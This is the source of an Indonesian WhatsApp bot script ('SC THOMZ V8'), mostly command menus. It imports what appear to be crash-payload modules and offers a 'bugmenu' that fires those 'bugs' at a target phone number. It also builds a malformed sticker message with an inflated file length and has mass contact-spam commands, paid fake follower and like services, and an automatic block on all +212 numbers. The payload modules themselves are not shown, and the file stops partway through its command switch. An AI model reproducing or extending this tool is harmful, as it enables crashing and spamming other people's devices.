/* SC THOMZ V8
BASE : HW MODS
RECODE : THOMZ
CREACOT : THOMZ
*/

require('./setting')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./lib/upload')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const hxz = require('hxz-api')
const ytdl = require("ytdl-core")
const { Configuration, OpenAIApi } = require('openai')
const { exec, spawn, execSync } = require("child_process")
const { ngazap } = require('./all/bugthomz/ngazap')
const { buttonkal } = require('./all/bugthomz/buttonkal')
const { cttl } = require('./all/bugthomz/cttl')
const { tizi } = require('./all/bugthomz/tizi')
const { weg } = require('./all/bugthomz/weg')
const { virtex7 } = require('./all/bugthomz/virtex7')
const { remini } = require('./all/remini')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
//=================================================//
// read database
//=================================================//
module.exports = haikal = async (haikal, m, chatUpdate, store) => {
 try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await haikal.decodeJid(haikal.user.id)
const sender = m.key.fromMe ? (haikal.user.id.split(':')[0]+'@s.whatsapp.net' || haikal.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await haikal.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false 
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const jam = moment.tz('asia/jakarta').format("HH:mm:ss");
const hariini = moment.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
const antilink = JSON.parse(fs.readFileSync('./all/antilink.json'));
const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
const jangan = m.isGroup ? pler.includes(m.chat) : false

// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return haikal.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

    
// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(botname), color(`[ PESAN ]`, `${randomcolor}`), color(`FROM`, `${randomcolor}`), color(`${pushname}`, `${randomcolor}`), color(`Text :`, `${randomcolor}`), color(`${body}`, `white`))
}

// Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot
const isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
}

// Jangan Di Edit Tar Error
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await haikal.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await haikal.getName(i + '@s.whatsapp.net')}\n
FN:${await haikal.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:tesheroku123@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://bit.ly/39Ivus6\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

const thomz = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},

'message': {
 "stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
        'isAnimated': []
}}}
// Function Reply
const reply = (teks) => { 
haikal.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "SC BY THOMZ`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": m, 
"mediaUrl": "https://www.youtube.com/@thomvelz1720", 
"sourceUrl": "https://www.youtube.com/@thomvelz1720" }}}, { quoted: m }) }

if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
haikal.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
haikal.groupParticipantsUpdate(m.chat, [sender], 'remove')
haikal.sendMessage(m.chat, { delete: m.key })
}
}

    
switch (command) {
case "allmenu": {
const text12 = `Hai Kak @${sender.split("@")[0]}

*⊷ SCRIPT BY : THOMZ*
*⊷ BOT NAME : THOMZ-BOTZ*
*⊷ PENGGUNA NAME : ${botname}*
*⊷ BUY SC : 628388072690*
*⊷ BUY BOT : 628388072690*

  FITUR OWNER
*⥁*${prefix}public
*⥁*${prefix}self
*⥁*${prefix}addprem *nomot/@tag*
*⥁*${prefix}delprem *nomot/@tag*
*⥁*${prefix}jadiadmin *nomot/@tag*
*⥁*${prefix}deletadmin *nomot/@tag*
*⥁*${prefix}antilink *on/of*
*⥁*${prefix}grup *on/of*
*⥁*${prefix}hidetag *text*
*⥁*${prefix}tagall *text*
*⥁*${prefix}linkgc
*⥁*${prefix}setlinkgc
*⥁*${prefix}join *link*
*⥁*${prefix}kick *nomot/@tag*
*⥁*${prefix}leave
*⥁*${prefix}editdesk *text*
*⥁*${prefix}setppgc *gambar*
*⥁*${prefix}setppbot *gambar*
*⥁*${prefix}setbotname *text*
*⥁*${prefix}setbiobot *text*
*⥁*${prefix}block *nomot/@tag*
*⥁*${prefix}unblock *nomot/@tag*

  JB MENU
*⥁*${prefix}formatpost
*⥁*${prefix}formatneed
*⥁*${prefix}feerekber
*⥁*${prefix}formatpencairan
*⥁*${prefix}mc nama grup
*⥁*${prefix}allrec
*⥁*${prefix}danamasuk
*⥁*${prefix}donerekber
*⥁*${prefix}donemc *isi manual*

  FT MENU
*⥁*${prefix}formatft
*⥁*${prefix}jadwalft

  STORE PANEL
*⥁*${prefix}listpanel
*⥁*${prefix}listvps
*⥁*${prefix}adminpanel
*⥁*${prefix}resellerpanel
*⥁*${prefix}produklain
*⥁*${prefix}sendpanel
*⥁*${prefix}sendvps
*⥁*${prefix}reqpanel

 MENU TOP UP GAME
*⥁*${prefix}listtopupff
*⥁*${prefix}listtopupml
*⥁*${prefix}formattopup

 MENU JASTEB
*⥁*${prefix}listjasteb
*⥁*${prefix}listunchek

 MENU SUNTIK SOSMEN
*⥁*${prefix}listsuntikig
*⥁*${prefix}listsuntiktt
*⥁*${prefix}listlikeig
*⥁*${prefix}listlikett
*⥁*${prefix}listviewtt

 MENU JOIN MURID
*⥁*${prefix}mursun
*⥁*${prefix}murses
*⥁*${prefix}murbug
*⥁*${prefix}murnokos
*⥁*${prefix}murunbanned
*⥁*${prefix}murkenon
*⥁*${prefix}join nama murid
*⥁*${prefix}sendgcmurid

 MENU STORE
*⥁*${prefix}payment
*⥁*${prefix}proses
*⥁*${prefix}batal
*⥁*${prefix}tunda
*⥁*${prefix}done

 JASA BUAT LOGO
*⥁*${prefix}listlogo

 FITUR PUSHKONTAK
*⥁*${prefix}jpm *teks*
*⥁*${prefix}jpm2 *teks*
*⥁*${prefix}idgc
*⥁*${prefix}listidgc
*⥁*${prefix}cekidgc
*⥁*${prefix}listgroup
*⥁*${prefix}ceknamagc
*⥁*${prefix}infogc
*⥁*${prefix}pushkontakid *id|text*
*⥁*${prefix}pushkontakgc *text*
*⥁*${prefix}pushkontakidjd *id|jeda|textT*
*⥁*${prefix}pushkontakgcjd *jeda|text*
*⥁*${prefix}savecontactid *id*
*⥁*${prefix}savecontactgc
*⥁*${prefix}savekontak
*⥁*${prefix}sendkontak
*⥁*${prefix}save *|nama*

    MENU PANEL
*⥁*${prefix}addgc
*⥁*${prefix}delgc
*⥁*${prefix}addprem
*⥁*${prefix}delprem
*⥁*${prefix}panel
*⥁*${prefix}listusr
*⥁*${prefix}delusr
*⥁*${prefix}listsrv
*⥁*${prefix}delsrv
*⥁*${prefix}ramlist
*⥁*${prefix}addusr
*⥁*${prefix}addsrv
*⥁*${prefix}createadmin
*⥁*${prefix}listadmin

 FITUR STIKER
*⥁*${prefix}qc *text*
*⥁*${prefix}tts *text*
*⥁*${prefix}sticker *gambar*

 FITUR JADI BOT
*⥁*${prefix}jadibot
*⥁*${prefix}stopjadibot
*⥁*${prefix}listjadibo

 FITUR RANDOME
*⥁*${prefix}autojpm
*⥁*${prefix}runtime
*⥁*${prefix}owner
*⥁*${prefix}script
*⥁*${prefix}yt
*⥁*${prefix}dtiktok
*⥁*${prefix}dtiktokmp3
*⥁*${prefix}mediafire
*⥁*${prefix}tomp4
*⥁*${prefix}toimg
*⥁*${prefix}remini
*⥁*${prefix}telegraph
*⥁*${prefix}kurang
*⥁*${prefix}tambah
*⥁*${prefix}kali
*⥁*${prefix}bagi

 BUG THOMZ X HW
*⥁*${prefix}bugmenu

JANGAN LUPA SUBSCRIBE
https://www.youtube.com/@thomvelz1720
`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "menu": {
const text12 = `Hai Kak @${sender.split("@")[0]}

*⊷ SCRIPT BY : THOMZ*
*⊷ BOT NAME : THOMZ-BOTZ*
*⊷ PENGGUNA NAME : ${botname}*
*⊷ BUY SC : 628388072690*
*⊷ BUY BOT : 628388072690*

  FITUR OWNER

*⥁*${prefix}allmenu
*⥁*${prefix}storemenu
*⥁*${prefix}grupmenu
*⥁*${prefix}pushkonmenu
*⥁*${prefix}panelmenu
*⥁*${prefix}menucucimata
*⥁*${prefix}randomemenu
*⥁*${prefix}soundmenu
*⥁*${prefix}domainmenu
*⥁*${prefix}bugmenu
*⥁*${prefix}menutestimoni

JANGAN LUPA SUBSCRIBE
https://www.youtube.com/@thomvelz1720
`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "storemenu": {
const text12 = `Hai Kak @${sender.split("@")[0]}

*⊷ SCRIPT BY : THOMZ*
*⊷ BOT NAME : THOMZ-BOTZ*
*⊷ PENGGUNA NAME : ${botname}*
*⊷ BUY SC : 628388072690*
*⊷ BUY BOT : 628388072690*

  JB MENU
*⥁*${prefix}formatpost
*⥁*${prefix}formatneed
*⥁*${prefix}feerekber
*⥁*${prefix}formatpencairan
*⥁*${prefix}mc nama grup
*⥁*${prefix}allrec
*⥁*${prefix}danamasuk
*⥁*${prefix}donerekber
*⥁*${prefix}donemc *isi manual*

  FT MENU
*⥁*${prefix}formatft
*⥁*${prefix}jadwalft

  STORE PANEL
*⥁*${prefix}listpanel
*⥁*${prefix}listvps
*⥁*${prefix}adminpanel
*⥁*${prefix}resellerpanel
*⥁*${prefix}produklain
*⥁*${prefix}sendpanel
*⥁*${prefix}sendvps
*⥁*${prefix}reqpanel

 MENU TOP UP GAME
*⥁*${prefix}listtopupff
*⥁*${prefix}listtopupml
*⥁*${prefix}formattopup

 MENU JASTEB
*⥁*${prefix}listjasteb
*⥁*${prefix}listunchek

 MENU SUNTIK SOSMEN
*⥁*${prefix}listsuntikig
*⥁*${prefix}listsuntiktt
*⥁*${prefix}listlikeig
*⥁*${prefix}listlikett
*⥁*${prefix}listviewtt

 MENU JOIN MURID
*⥁*${prefix}mursun
*⥁*${prefix}murses
*⥁*${prefix}murbug
*⥁*${prefix}murnokos
*⥁*${prefix}murunbanned
*⥁*${prefix}murkenon
*⥁*${prefix}join nama murid
*⥁*${prefix}sendgcmurid

 MENU STORE
*⥁*${prefix}payment
*⥁*${prefix}proses
*⥁*${prefix}batal
    *⥁*${prefix}tunda*⥁*${prefix}done

 JASA BUAT LOGO
*⥁*${prefix}listlogo
JANGAN LUPA SUBSCRIBE
https://www.youtube.com/@thomvelz1720
`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "domainmenu": {
const text12 = `Hai Kak @${sender.split("@")[0]}

*⊷ SCRIPT BY : THOMZ*
*⊷ BOT NAME : THOMZ-BOTZ*
*⊷ PENGGUNA NAME : ${botname}*
*⊷ BUY SC : 628388072690*
*⊷ BUY BOT : 628388072690*

 FITUR RANDOME
*⥁*${prefix}domain1 panellstore.com
*⥁*${prefix}domain2 panellstore.net
*⥁*${prefix}domain3 panellstore.icu
*⥁*${prefix}domain4 panellstore.xyz
*⥁*${prefix}domain5 panellstore.art
*⥁*${prefix}domain6 panellkuu.com
*⥁*${prefix}domain7 jasa-panel.my.id 
*⥁*${prefix}domain8 didinsec.biz.id 
*⥁*${prefix}domain9 putraoffc.cfd 
*⥁*${prefix}domain10 sellerpannel.my.id 
*⥁*${prefix}domain11 pannelku.icu
*⥁*${prefix}domain12 pannelku.cfd
*⥁*${prefix}domain13 putraoffc.site
*⥁*${prefix}domain14 putraoffc.com 
*⥁*${prefix}domain15 kangpannel.xyz 
*⥁*${prefix}domain16 mypannelku.com 
*⥁*${prefix}domain17 pannelmurah.xyz
*⥁*${prefix}domain18 storepannel.xyz
*⥁*${prefix}domain19 tokopannel.xyz
*⥁*${prefix}domain20 mypannel.cfd
*⥁*${prefix}domain21 adminpannel.xyz
*⥁*${prefix}domain22 mypannel.icu
*⥁*${prefix}domain23 tokocpannelmurah.xyz
*⥁*${prefix}domain24 websitepannelmurah.com
*⥁*${prefix}domain25 panellku.my.id
*⥁*${prefix}domain26 panellku.me
*⥁*${prefix}domain27 panellku.biz.id 
*⥁*${prefix}domain28 panellku.tech 
*⥁*${prefix}domain29 panelkuu.xyz
*⥁*${prefix}domain30 panellku.com
*⥁*${prefix}domain31 biistoreee.tech
*⥁*${prefix}domain32 biistoreee.xyz 
*⥁*${prefix}domain33 rulzxyxd.com 
*⥁*${prefix}domain34 rafatharoffc.dev
*⥁*${prefix}domain35 rafatharoffcial.dev
*⥁*${prefix}domain36 rizalshop.my.id
*⥁*${prefix}domain37 panelku.link
*⥁*${prefix}domain38 sanzyy.xyz
*⥁*${prefix}domain39 home-panel.pw
*⥁*${prefix}domain40 aswinxd.me
*⥁*${prefix}domain41 panel-zall.me
*⥁*${prefix}domain42 digital-market.me
*⥁*${prefix}domain43 rafatharofficial.my.id
*⥁*${prefix}domain44 tokodigital.software

JANGAN LUPA SUBSCRIBE
https://www.youtube.com/@thomvelz1720
`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "randomemenu": {
const text12 = `Hai Kak @${sender.split("@")[0]}

*⊷ SCRIPT BY : THOMZ*
*⊷ BOT NAME : THOMZ-BOTZ*
*⊷ PENGGUNA NAME : ${botname}*
*⊷ BUY SC : 628388072690*
*⊷ BUY BOT : 628388072690*

 FITUR RANDOME
*⥁*${prefix}autojpm
*⥁*${prefix}runtime
*⥁*${prefix}owner
*⥁*${prefix}script
*⥁*${prefix}yt
*⥁*${prefix}dtiktok
*⥁*${prefix}dtiktokmp3
*⥁*${prefix}mediafire
*⥁*${prefix}tomp4
*⥁*${prefix}toimg
*⥁*${prefix}remini
*⥁*${prefix}telegraph
*⥁*${prefix}kurang
*⥁*${prefix}tambah
*⥁*${prefix}kali
*⥁*${prefix}bagi

JANGAN LUPA SUBSCRIBE
https://www.youtube.com/@thomvelz1720
`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "grupmenu": {
const text12 = `Hai Kak @${sender.split("@")[0]}

*⊷ SCRIPT BY : THOMZ*
*⊷ BOT NAME : THOMZ-BOTZ*
*⊷ PENGGUNA NAME : ${botname}*
*⊷ BUY SC : 628388072690*
*⊷ BUY BOT : 628388072690*

  FITUR OWNER
*⥁*${prefix}public
*⥁*${prefix}self
*⥁*${prefix}addprem *nomot/@tag*
*⥁*${prefix}delprem *nomot/@tag*
*⥁*${prefix}jadiadmin *nomot/@tag*
*⥁*${prefix}deletadmin *nomot/@tag*
*⥁*${prefix}antilink *on/of*
*⥁*${prefix}grup *on/of*
*⥁*${prefix}hidetag *text*
*⥁*${prefix}tagall *text*
*⥁*${prefix}linkgc
*⥁*${prefix}setlinkgc
*⥁*${prefix}join *link*
*⥁*${prefix}kick *nomot/@tag*
*⥁*${prefix}leave
*⥁*${prefix}editdesk *text*
*⥁*${prefix}setppgc *gambar*
*⥁*${prefix}setppbot *gambar*
*⥁*${prefix}setbotname *text*
*⥁*${prefix}setbiobot *text*
*⥁*${prefix}block *nomot/@tag*
*⥁*${prefix}unblock *nomot/@tag*

JANGAN LUPA SUBSCRIBE
https://www.youtube.com/@thomvelz1720
`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "pushkonmenu": {
const text12 = `Hai Kak @${sender.split("@")[0]}

*⊷ SCRIPT BY : THOMZ*
*⊷ BOT NAME : THOMZ-BOTZ*
*⊷ PENGGUNA NAME : ${botname}*
*⊷ BUY SC : 628388072690*
*⊷ BUY BOT : 628388072690*

 FITUR PUSHKONTAK
*⥁*${prefix}jpm *teks*
*⥁*${prefix}jpm2 *teks*
*⥁*${prefix}jpm3 *teks*
*⥁*${prefix}idgc
*⥁*${prefix}listidgc
*⥁*${prefix}cekidgc
*⥁*${prefix}listgroup
*⥁*${prefix}ceknamagc
*⥁*${prefix}infogc
*⥁*${prefix}pushkontakid *id|text*
*⥁*${prefix}pushkontakgc *text*
*⥁*${prefix}pushkontakidjd *id|jeda|textT*
*⥁*${prefix}pushkontakgcjd *jeda|text*
*⥁*${prefix}savecontactid *id*
*⥁*${prefix}savecontactgc
*⥁*${prefix}savekontak
*⥁*${prefix}sendkontak
*⥁*${prefix}save *|nama*

JANGAN LUPA SUBSCRIBE
https://www.youtube.com/@thomvelz1720
`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "panelmenu": {
const text12 = `Hai Kak @${sender.split("@")[0]}

*⊷ SCRIPT BY : THOMZ*
*⊷ BOT NAME : THOMZ-BOTZ*
*⊷ PENGGUNA NAME : ${botname}*
*⊷ BUY SC : 628388072690*
*⊷ BUY BOT : 628388072690*

    MENU PANEL
*⥁*${prefix}addgc
*⥁*${prefix}delgc
*⥁*${prefix}addprem
*⥁*${prefix}delprem
*⥁*${prefix}panel
*⥁*${prefix}listusr
*⥁*${prefix}delusr
*⥁*${prefix}listsrv
*⥁*${prefix}delsrv
*⥁*${prefix}ramlist
*⥁*${prefix}addusr
*⥁*${prefix}addsrv
*⥁*${prefix}createadmin
*⥁*${prefix}listadmin

JANGAN LUPA SUBSCRIBE
https://www.youtube.com/@thomvelz1720
`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "menucucimata": {
const text12 = `Hai Kak @${sender.split("@")[0]}

*⊷ SCRIPT BY : THOMZ*
*⊷ BOT NAME : THOMZ-BOTZ*
*⊷ PENGGUNA NAME : ${botname}*
*⊷ BUY SC : 628388072690*
*⊷ BUY BOT : 628388072690*

  FITUR TESTIMONI
*⥁*${prefix} cecanindo
*⥁*${prefix} cecanchina
*⥁*${prefix} cecanhijaber
*⥁*${prefix} cecanmalaysia
*⥁*${prefix} cecanvietnam
*⥁*${prefix} cecankorea
*⥁*${prefix} cecanjepan
*⥁*${prefix} cecan
*⥁*${prefix} art
*⥁*${prefix} awoo
*⥁*${prefix} bts
*⥁*${prefix} cogan
*⥁*${prefix} elaina
*⥁*${prefix} exo
*⥁*${prefix} elf
*⥁*${prefix} estetic
*⥁*${prefix} kanna
*⥁*${prefix} loli
*⥁*${prefix} neko2
*⥁*${prefix} waifu
*⥁*${prefix} shota
*⥁*${prefix} husbu
*⥁*${prefix} sagiri
*⥁*${prefix} shinobu
*⥁*${prefix} megumin
*⥁*${prefix} wallnime
*⥁*${prefix} quotesimage
*⥁*${prefix} neko
*⥁*${prefix} waifu
*⥁*${prefix} kill
*⥁*${prefix} pat
*⥁*${prefix} lick
*⥁*${prefix} bite
*⥁*${prefix} yeet
*⥁*${prefix} bonk
*⥁*${prefix} wink
*⥁*${prefix} poke
*⥁*${prefix} nom
*⥁*${prefix} slap
*⥁*${prefix} smile
*⥁*${prefix} wave
*⥁*${prefix} blush
*⥁*${prefix} smug
*⥁*${prefix} glomp
*⥁*${prefix} happy
*⥁*${prefix} dance
*⥁*${prefix} cringe
*⥁*${prefix} highfive
*⥁*${prefix} handhold

JANGAN LUPA SUBSCRIBE
https://www.youtube.com/@thomvelz1720
`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "menutestimoni": {
const text12 = `Hai Kak @${sender.split("@")[0]}

*⊷ SCRIPT BY : THOMZ*
*⊷ BOT NAME : THOMZ-BOTZ*
*⊷ PENGGUNA NAME : ${botname}*
*⊷ BUY SC : 628388072690*
*⊷ BUY BOT : 628388072690*

  FITUR TESTIMONI
*⥁*${prefix}testi1
*⥁*${prefix}testi2
*⥁*${prefix}testi3
*⥁*${prefix}testi4
*⥁*${prefix}testi5
*⥁*${prefix}testi6
*⥁*${prefix}testi7
*⥁*${prefix}testi8
*⥁*${prefix}testi9
*⥁*${prefix}testi10

JANGAN LUPA SUBSCRIBE
https://www.youtube.com/@thomvelz1720
`
haikal.sendMessage(from, { image: { url: `https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "bugmenu": {
const text12 = `Hai Kak @${sender.split("@")[0]}

*⊷ SCRIPT BY : THOMZ*
*⊷ BOT NAME : THOMZ-BOTZ*
*⊷ PENGGUNA NAME : ${botname}*
*⊷ BUY SC : 628388072690*
*⊷ BUY BOT : 628388072690*

   BUG THOMZ JUMLAH
*⥁*${prefix}🗿 (628xxxx)
*⥁*${prefix}🥔 (628xxxx)
*⥁*${prefix}🌰 (628xxxx)
*⥁*${prefix}🎂 (628xxxx)
*⥁*${prefix}🍆 (628xxxx) 
*⥁*${prefix}🥑 (628xxxx)
*⥁*${prefix}🥒 (628xxxx)
*⥁*${prefix}🥦 (628xxxx)
*⥁*${prefix}🌽 (628xxxx)
*⥁*${prefix}🍠 (628xxxx)
*⥁*${prefix}🥕 (628xxxx)
*⥁*${prefix}🌶️ (628xxxx)
*⥁*${prefix}🍅 (628xxxx)
*⥁*${prefix}🥥 (628xxxx)
*⥁*${prefix}🍇 (628xxxx)
*⥁*${prefix}🥝 (628xxxx)
*⥁*${prefix}🍐 (628xxxx)
*⥁*${prefix}🍏 (628xxxx)
*⥁*${prefix}🍈 (628xxxx)
*⥁*${prefix}🍋 (628xxxx)
*⥁*${prefix}🍌 (628xxxx)
*⥁*${prefix}🍍 (628xxxx)
*⥁*${prefix}🍊 (628xxxx)
*⥁*${prefix}🍑 (628xxxx)
*⥁*${prefix}🍉 (628xxxx) 
*⥁*${prefix}🍎 (628xxxx) 
*⥁*${prefix}🍒️ (628xxxx) 
*⥁*${prefix}🍓 (628xxxx) 
*⥁*${prefix}🍄 (628xxxx) 
*⥁*${prefix}🌻 (628xxxx) 
*⥁*${prefix}🏵️ (628xxxx) 
*⥁*${prefix}💮 (628xxxx) 
*⥁*${prefix}🌸 (628xxxx) 
*⥁*${prefix}🌺 (628xxxx) 
*⥁*${prefix}🥀 (628xxxx)
*⥁*${prefix}🌹 (628xxxx)
*⥁*${prefix}🤯 (628xxxx)
*⥁*${prefix}🖕 (628xxxx)
*⥁*${prefix}🤙 (628xxxx)
*⥁*${prefix}💋 (628xxxx)
*⥁*${prefix}💦 (628xxxx)
*⥁*${prefix}💩 (628xxxx)
*⥁*${prefix}👿 (628xxxx)
*⥁*${prefix}👻 (628xxxx)
*⥁*${prefix}🤡 (628xxxx)
*⥁*${prefix}🤮 (628xxxx)
*⥁*${prefix}😇 (628xxxx)
*⥁*${prefix}😠 (628xxxx)
*⥁*${prefix}😭 (628xxxx)
*⥁*${prefix}🔥 (628xxxx)
*⥁*${prefix}😜 (628xxxx)
*⥁*${prefix}😎 (628xxxx)
*⥁*${prefix}😡 (628xxxx)
*⥁*${prefix}🤫 (628xxxx)
*⥁*${prefix}❤️ (628xxxx)
*⥁*${prefix}😁 (628xxxx)
*⥁*${prefix}😱 (628xxxx)
*⥁*${prefix}🤣 (628xxxx)
*⥁*${prefix}😂 (628xxxx)
*⥁*${prefix}😘 (628xxxx)
*⥁*${prefix}💔 (628xxxx)
*⥁*${prefix}👊 (628xxxx)

   BUG THOMZ CHAT PRIBADI
*⥁*${prefix}🌷 (628xxxx)
*⥁*${prefix}🐲 (628xxxx)
*⥁*${prefix}🐉 (628xxxx)
